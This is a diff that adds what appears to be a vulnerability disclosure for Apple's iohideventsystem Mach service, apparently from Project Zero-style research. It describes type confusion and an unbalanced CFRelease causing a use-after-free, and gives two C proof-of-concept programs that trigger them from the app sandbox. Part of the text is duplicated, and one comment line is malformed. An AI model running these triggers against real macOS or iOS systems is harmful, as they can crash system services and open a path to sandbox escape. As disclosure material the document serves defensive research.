@@ -1,0 +1,162 @@
+/*
+It's possible that this should be two separate issues but I'm filing it as one as I'm still understanding
+this service.
+
+com.apple.iohideventsystem is hosted in hidd on MacOS and backboardd on iOS. You can talk to it from the app
+sandbox on iOS.
+
+It uses an IOMIGMachPortCache to translate between ports on which messages were received and CF objects
+on which actions should be performed. There is insufficient checking that the types are correct; so far as
+I can tell all the io_hideventsystem_* methods apart from io_hideventsystem_open expect to be called on
+a "connection" port, but that's not enforced. Specifically, the service port is put in the cache mapped to
+an IOHIDEventServer object, and each connection is put in mapped to IOHIDEventSystemConnection objects. Note that
+the service IOMIG port can demux the whole hideventsystem service (all the methods.) This seems to lead to a lot
+of type confusion issues (eg places where the code is trying to read a bitmap of entitlements possessed by the connection
+but is in fact reading out of bounds.)
+
+There's also what looks like a regular memory safety issue in
+_io_hideventsystem_unregister_record_service_changed_notification.
+
+This converts the port its called on to an object via IOMIGMachPortCacheCopy then passes that to
+_IOHIDEventSystemConnectionUnregisterRecordServiceChanged.
+
+This reads an object pointer from +0x10, which for both an IOHIDEventServer and IOHIDEventSystemConnection is an IOHIDEventSystem, 
+passes that to _IOHIDEventSystemUnregisterRecordServiceChanged and then calls CFRelease on it.
+
+The problem is that this CFRelease call isn't balanced by a CFRetain, so each call to this just lets us arbitrarily drop references
+on that object...
+
+The PoC for this issue is trivial, just connect to the service and call io_hideventsystem_unregister_record_service_changed_notification twice.
+
+You should enable guard malloc for the service to more easily see what's going on.
+
+Tested on MacOS 10.14.1 (18B75)
+
+
+// ianbeer
+// build: clang -o hidcrasher hidcrasher.c -framework IOKit
+// repro: enable guard malloc for hidd: sudo launchctl debug system/com.apple.hidd --guard-malloc
+//        then either manually kill hidd or run the PoC twice so that the second time you can more clearly observe the UaF
+
+#if 0
+iOS/MacOS Sandbox escapes due to type confusions and memory safety issues in iohideventsystem
+
+It's possible that this should be two separate issues but I'm filing it as one as I'm still understanding
+this service.
+
+com.apple.iohideventsystem is hosted in hidd on MacOS and backboardd on iOS. You can talk to it from the app
+sandbox on iOS.
+
+It uses an IOMIGMachPortCache to translate between ports on which messages were received and CF objects
+on which actions should be performed. There is insufficient checking that the types are correct; so far as
+I can tell all the io_hideventsystem_* methods apart from io_hideventsystem_open expect to be called on
+a "connection" port, but that's not enforced. Specifically, the service port is put in the cache mapped to
+an IOHIDEventServer object, and each connection is put in mapped to IOHIDEventSystemConnection objects. Note that
+the service IOMIG port can demux the whole hideventsystem service (all the methods.) This seems to lead to a lot
+of type confusion issues (eg places where the code is trying to read a bitmap of entitlements possessed by the connection
+but is in fact reading out of bounds.)
+
+There's also what looks like a regular memory safety issue in
+_io_hideventsystem_unregister_record_service_changed_notification.
+
+This converts the port its called on to an object via IOMIGMachPortCacheCopy then passes that to
+_IOHIDEventSystemConnectionUnregisterRecordServiceChanged.
+
+This reads an object pointer from +0x10, which for both an IOHIDEventServer and IOHIDEventSystemConnection is an IOHIDEventSystem, 
+passes that to _IOHIDEventSystemUnregisterRecordServiceChanged and then calls CFRelease on it.
+
+The problem is that this CFRelease call isn't balanced by a CFRetain, so each call to this just lets us arbitrarily drop references
+on that object...
+
+The PoC for this issue is trivial, just connect to the service and call io_hideventsystem_unregister_record_service_changed_notification twice.
+
+You should enable guard malloc for the service to more easily see what's going on.
+
+Tested on MacOS 10.14.1 (18B75)
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#include <mach/mach.h>
+#include <mach/mach_vm.h>
+#include <servers/bootstrap.h>
+
+kern_return_t io_hideventsystem_unregister_record_service_changed_notification(
+  mach_port_t service_connection);
+
+int main(int argc, char** argv) {
+  kern_return_t err;
+  
+  // connect to the com.apple.iohideventsystem service
+
+  mach_port_t service_port = MACH_PORT_NULL;
+
+  err = bootstrap_look_up(bootstrap_port, "com.apple.iohideventsystem", &service_port);
+  if (err != KERN_SUCCESS || service_port == MACH_PORT_NULL) {
+    printf("failed to lookup service\n");
+    exit(EXIT_FAILURE);
+  }
+
+  printf("got service port: 0x%x\n", service_port);
+  
+  for (int i = 0; i < 10; i++) {
+    io_hideventsystem_unregister_record_service_changed_notification(service_port);
+  }
+  return 0;
+}
+*/
+
+/ ianbeer
+// build: clang -o hid_typeconfusion hid_typeconfusion.c -framework IOKit -framework CoreFoundation
+// repro: enable guard malloc for hidd: sudo launchctl debug system/com.apple.hidd --guard-malloc
+//        then kill hidd so it restarts with guard malloc enabled
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#include <mach/mach.h>
+#include <mach/mach_vm.h>
+#include <servers/bootstrap.h>
+
+#include <CoreFoundation/CoreFoundation.h>
+
+kern_return_t io_hideventsystem_create_virtual_service(
+  mach_port_t connection,
+  void* desc,
+  uint32_t desc_len,
+  uint64_t* id_out);
+
+extern uint32_t _IOHIDSerialize(CFTypeRef obj, mach_vm_address_t* out);
+
+int main(int argc, char** argv) {
+  kern_return_t err;
+  
+  /* connect to the com.apple.iohideventsystem service */
+
+  mach_port_t service_port = MACH_PORT_NULL;
+
+  err = bootstrap_look_up(bootstrap_port, "com.apple.iohideventsystem", &service_port);
+  if (err != KERN_SUCCESS || service_port == MACH_PORT_NULL) {
+    printf("failed to lookup service\n");
+    exit(EXIT_FAILURE);
+  }
+
+  printf("got service port: 0x%x\n", service_port);
+  
+  /* need a dictionary */
+  CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+  CFDictionaryAddValue(dict, CFSTR("key"), CFSTR("value"));
+
+  mach_vm_address_t out_ptr = 0;
+  uint32_t size = _IOHIDSerialize(dict, &out_ptr);
+
+  CFRelease(dict);
+
+  uint64_t id_out = 0;
+  err = io_hideventsystem_create_virtual_service(service_port, (void*)out_ptr, size, &id_out);
+  
+  return 0;
+}
